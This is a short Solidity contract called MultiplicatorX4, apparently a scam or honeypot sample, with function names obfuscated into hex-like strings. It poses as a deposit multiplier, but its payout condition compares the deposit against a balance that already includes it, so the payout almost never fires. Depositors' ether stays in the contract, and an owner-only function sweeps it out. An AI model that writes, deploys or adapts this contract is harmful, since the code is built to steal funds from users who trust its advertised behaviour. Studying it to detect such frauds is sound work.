pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner = msg.sender;

    function() public payable{}

    function _0xb0b3b1()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _0xb42e79,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        _0xb42e79.call.value(msg.value)(data);
    }

    function _0x0137fa(address _0xb42e79)
    public
    payable
    {
        if(msg.value>=this.balance)
        {
            _0xb42e79.transfer(this.balance+msg.value);
        }
    }
}